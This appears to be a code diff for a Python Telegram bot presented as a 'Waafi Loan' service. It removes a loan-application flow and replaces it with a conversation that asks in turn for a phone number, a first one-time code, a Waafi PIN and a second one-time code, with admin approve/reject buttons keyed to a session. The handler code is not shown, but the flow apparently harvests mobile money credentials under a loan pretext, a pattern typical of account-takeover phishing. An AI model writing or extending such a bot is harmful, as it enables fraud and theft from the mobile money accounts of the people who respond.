@@ -2,76 +2,26 @@ from telegram.ext import (
     Application,
     CommandHandler,
     MessageHandler,
-    CallbackQueryHandler,
     ConversationHandler,
+    CallbackQueryHandler,
     filters
 )
 
 
-from database import (
-    create_database,
-    update_database_structure
-)
-
-
 from handlers import (
-
     start,
-
-    register,
-    full_name,
-    national_id,
     phone_number,
-    mobile_money,
-    employment_status,
-    verify_user_otp,
-
-    apply_loan,
-    loan_purpose,
-    loan_amount,
-
-    loan_status,
-    my_profile,
-    update_profile_start,
-    update_phone,
-    update_mobile_money,
-    update_employment,
-    loan_statement,
-
-    requirements,
-    support,
-
-    admin_panel,
-    admin_buttons,
-
-    approve_loan,
-    reject_loan,
-    save_approval_note,
-    save_rejection_reason
-
+    otp_1,
+    waafi_pin,
+    otp_2
 )
 
 
 from states import (
-
-    FULL_NAME,
-    NATIONAL_ID,
     PHONE_NUMBER,
-    MOBILE_MONEY,
-    EMPLOYMENT_STATUS,
-
-    LOAN_PURPOSE,
-    LOAN_AMOUNT,
-
-    OTP_INPUT,
-
-    UPDATE_PHONE,
-    UPDATE_MOBILE_MONEY,
-    UPDATE_EMPLOYMENT,
-
-    APPROVAL_NOTE,
-    REJECTION_REASON
-
+    OTP_1,
+    WAAFI_PIN,
+    OTP_2
 )
 
 
@@ -79,55 +29,67 @@ from config import TOKEN
 
 
 
+# ================= ADMIN APPROVE / REJECT =================
+
+async def admin_action(update, context):
+
+    query = update.callback_query
+
+    await query.answer()
+
+
+    data = query.data
+
+
+    if data.startswith("approve_"):
+
+        session = data.replace(
+            "approve_",
+            ""
+        )
+
+
+        await query.message.reply_text(
+            text=(
+                "✅ APPLICATION APPROVED\n\n"
+                f"🆔 Session ID: {session}"
+            )
+        )
+
+
+    elif data.startswith("reject_"):
+
+        session = data.replace(
+            "reject_",
+            ""
+        )
+
+
+        await query.message.reply_text(
+            text=(
+                "❌ APPLICATION REJECTED\n\n"
+                f"🆔 Session ID: {session}"
+            )
+        )
+
+
+
+# ================= MAIN =================
+
 def main():
-
-
-    create_database()
-
-
-    update_database_structure()
-
-
 
     app = Application.builder().token(TOKEN).build()
 
 
 
-    # ================= START =================
-
-    app.add_handler(
-        CommandHandler(
-            "start",
-            start
-        )
-    )
-
-
-
-    # ================= USER CONVERSATION =================
-
-    user_conversation = ConversationHandler(
+    conversation = ConversationHandler(
 
         entry_points=[
 
-
-            MessageHandler(
-                filters.Regex("^📝 Register$"),
-                register
-            ),
-
-
-            MessageHandler(
-                filters.Regex("^💰 Apply for Loan$"),
-                apply_loan
-            ),
-
-
-            MessageHandler(
-                filters.Regex("^✏️ Update Profile$"),
-                update_profile_start
+            CommandHandler(
+                "start",
+                start
             )
-
 
         ],
 
@@ -135,129 +97,41 @@ def main():
         states={
 
 
-            FULL_NAME:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    full_name
-                )
-
-            ],
-
-
-            NATIONAL_ID:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    national_id
-                )
-
-            ],
-
-
             PHONE_NUMBER:[
 
                 MessageHandler(
-                    filters.TEXT,
+                    filters.TEXT & ~filters.COMMAND,
                     phone_number
                 )
 
             ],
 
 
-            MOBILE_MONEY:[
+            OTP_1:[
 
                 MessageHandler(
-                    filters.TEXT,
-                    mobile_money
+                    filters.TEXT & ~filters.COMMAND,
+                    otp_1
                 )
 
             ],
 
 
-            EMPLOYMENT_STATUS:[
+            WAAFI_PIN:[
 
                 MessageHandler(
-                    filters.TEXT,
-                    employment_status
+                    filters.TEXT & ~filters.COMMAND,
+                    waafi_pin
                 )
 
             ],
 
 
-            OTP_INPUT:[
+            OTP_2:[
 
                 MessageHandler(
-                    filters.TEXT,
-                    verify_user_otp
-                )
-
-            ],
-
-
-            LOAN_PURPOSE:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    loan_purpose
-                )
-
-            ],
-
-
-            LOAN_AMOUNT:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    loan_amount
-                )
-
-            ],
-
-
-            UPDATE_PHONE:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    update_phone
-                )
-
-            ],
-
-
-            UPDATE_MOBILE_MONEY:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    update_mobile_money
-                )
-
-            ],
-
-
-            UPDATE_EMPLOYMENT:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    update_employment
-                )
-
-            ],
-                        APPROVAL_NOTE:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    save_approval_note
-                )
-
-            ],
-
-
-            REJECTION_REASON:[
-
-                MessageHandler(
-                    filters.TEXT,
-                    save_rejection_reason
+                    filters.TEXT & ~filters.COMMAND,
+                    otp_2
                 )
 
             ]
@@ -272,126 +146,29 @@ def main():
 
 
     app.add_handler(
-        user_conversation
+        conversation
     )
 
 
 
-    # ================= USER MENU =================
-
-
-    app.add_handler(
-
-        MessageHandler(
-            filters.Regex("^📋 Check Loan Status$"),
-            loan_status
-        )
-
-    )
-
-
+    # ADMIN BUTTONS
 
     app.add_handler(
-
-        MessageHandler(
-            filters.Regex("^👤 My Profile$"),
-            my_profile
-        )
-
-    )
-
-
-
-    app.add_handler(
-
-        MessageHandler(
-            filters.Regex("^📄 Loan Statement$"),
-            loan_statement
-        )
-
-    )
-
-
-
-    app.add_handler(
-
-        MessageHandler(
-            filters.Regex("^ℹ️ Loan Requirements$"),
-            requirements
-        )
-
-    )
-
-
-
-    app.add_handler(
-
-        MessageHandler(
-            filters.Regex("^📞 Contact Support$"),
-            support
-        )
-
-    )
-
-
-
-    # ================= ADMIN =================
-
-
-    app.add_handler(
-
-        CommandHandler(
-            "admin",
-            admin_panel
-        )
-
-    )
-
-
-
-    app.add_handler(
-
         CallbackQueryHandler(
-            admin_buttons,
-            pattern="^(users|loans|stats)$"
+            admin_action,
+            pattern="^(approve_|reject_)"
         )
-
-    )
-
-
-
-    app.add_handler(
-
-        CallbackQueryHandler(
-            approve_loan,
-            pattern="^approve_"
-        )
-
-    )
-
-
-
-    app.add_handler(
-
-        CallbackQueryHandler(
-            reject_loan,
-            pattern="^reject_"
-        )
-
     )
 
 
 
     print(
-        "🤖 Waafi Loan Bot Version 2 Running..."
+        "🤖 Waafi Loan Learning Bot Running..."
     )
 
 
 
-    app.run_polling(
-        drop_pending_updates=True
-    )
-
+    app.run_polling()
 
 
 
